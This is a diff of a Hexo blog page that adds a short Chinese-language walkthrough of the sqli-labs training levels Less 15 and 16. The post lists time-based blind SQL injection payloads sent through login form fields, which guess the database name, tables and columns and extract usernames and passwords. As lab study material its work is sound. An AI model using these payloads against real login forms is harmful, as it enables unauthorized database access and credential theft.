@@ -13,6 +13,14 @@
     
 
     
+        <meta name="description" content="Less 15
+1.先输入前面的测试语句，发现输入什么都没有回显，所以采用时间延时注入。
+2.数据库长度
+uname=admin&amp;#39; and if(length(database())=8,sleep(5),1)#
+passwd=admin&amp;amp;submit=Submit
+
+3.猜数据库名"/>
+    
 
     <!--Author-->
     
@@ -21,10 +29,18 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="Hexo"/>
+        <meta property="og:title" content="sqli-labs 9"/>
     
 
     <!--Open Graph Description-->
+    
+        <meta property="og:description" content="Less 15
+1.先输入前面的测试语句，发现输入什么都没有回显，所以采用时间延时注入。
+2.数据库长度
+uname=admin&amp;#39; and if(length(database())=8,sleep(5),1)#
+passwd=admin&amp;amp;submit=Submit
+
+3.猜数据库名"/>
     
 
     <!--Open Graph Site Name-->
@@ -32,7 +48,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website"/>
+        <meta property="og:type" content="article"/>
     
 
     <!--Page Cover-->
@@ -51,7 +67,7 @@
 
     <!-- Title -->
     
-    <title>page - Hexo</title>
+    <title>sqli-labs 9 - Hexo</title>
 
     <!-- Bootstrap Core CSS -->
     <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
@@ -156,128 +172,84 @@
 
     <!-- Main Content -->
     <!-- Page Header -->
-<!-- Set your background image for this header in the theme's configuration: index_cover -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
 <header class="intro-header" style="background-image: url('/img/home-bg.jpg')">
     <div class="container">
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <div class="site-heading">
-                    <h1>Hexo</h1>
-                    <hr class="small">
-                    <span class="subheading"></span>
+                <div class="post-heading">
+                    <h1>sqli-labs 9</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2021-08-18
+                        
+                    </span>
                 </div>
             </div>
         </div>
     </div>
 </header>
 
-<!-- Main Content -->
-<div class="container">
-    <div class="row">
-        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-            
-                <div class="post-preview">
-    <a href="/2021/07/31/初学sql/">
-        <h2 class="post-title">
-            初学sql
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-31
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/23/网安夏令营day5/">
-        <h2 class="post-title">
-            网安夏令营day5
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-23
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/22/网安夏令营day4/">
-        <h2 class="post-title">
-            网安夏令营day4
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-22
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/21/网安夏令营day3/">
-        <h2 class="post-title">
-            网安夏令营day3
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-21
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/20/网安夏令营day2/">
-        <h2 class="post-title">
-            网安夏令营day2
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-20
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/19/网安夏令营day1/">
-        <h2 class="post-title">
-            网安夏令营day1
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-19
-    </p>
-</div>
-<hr>
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
             
 
-            <ul class="pager">
-    
-        <li class="previous"><a href="/">&larr;  Newer Posts</a></li>
-    
-    
-</ul>
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>Less 15</p>
+<p>1.先输入前面的测试语句，发现输入什么都没有回显，所以采用时间延时注入。</p>
+<p>2.数据库长度</p>
+<pre><code>uname=admin&#39; and if(length(database())=8,sleep(5),1)#
+passwd=admin&amp;submit=Submit
+</code></pre>
+<p>3.猜数据库名</p>
+<pre><code>uname=admin&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)#
+passwd=admin&amp;submit=Submit
+</code></pre>
+<p>4.猜表名</p>
+<pre><code>uname=admin&#39; and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; ,sleep(5),1)#
+passwd=admin&amp;submit=Submit
+</code></pre>
+<p>5.猜列名</p>
+<pre><code>uname=admin&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; ,sleep(5),1)#
+passwd=admin&amp;submit=Submit
+
+uname=admin&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+
+passwd=admin&amp;submit=Submit
+</code></pre>
+<p>6.猜字段</p>
+<pre><code>uname=admin&#39; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)#
+passwd=admin&amp;submit=Submit
+</code></pre>
+<p>Less 16</p>
+<p> 本关的思路与注入方法与Less 15一致，只不过单引号改为双引号+括号即可。</p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
         </div>
     </div>
-</div>
-
-
+</article>
 
     <!-- Footer -->
     <hr />
